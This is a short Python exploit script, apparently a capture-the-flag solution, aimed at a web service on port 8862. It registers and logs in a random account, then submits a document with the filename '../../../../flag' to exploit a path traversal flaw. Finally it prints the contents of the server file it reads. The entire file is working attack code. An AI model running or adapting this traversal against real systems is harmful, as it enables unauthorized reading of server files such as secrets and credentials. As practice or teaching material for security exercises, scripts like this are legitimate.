#!/usr/bin/env python3

import secrets
import sys
from urllib.parse import urljoin

import requests


def main() -> int:
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} http://HOST:8862/")
        return 2

    base_url = sys.argv[1]
    if not base_url.endswith("/"):
        base_url += "/"

    s = requests.Session()

    username = f"user_{secrets.token_hex(8)}"
    password = secrets.token_hex(16)

    r = s.post(
        urljoin(base_url, "register"),
        json={"username": username, "password": password},
        timeout=10,
    )
    r.raise_for_status()

    r = s.post(
        urljoin(base_url, "login"),
        json={"username": username, "password": password},
        timeout=10,
    )
    r.raise_for_status()

    r = s.post(
        urljoin(base_url, "documentfile"),
        json={"title": "flag", "filename": "../../../../flag"},
        timeout=10,
    )
    r.raise_for_status()

    doc_id = r.json()["id"]

    r = s.get(urljoin(base_url, f"documents/{doc_id}"), timeout=10)
    r.raise_for_status()

    content = r.json()["content"]
    print(content.strip())
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

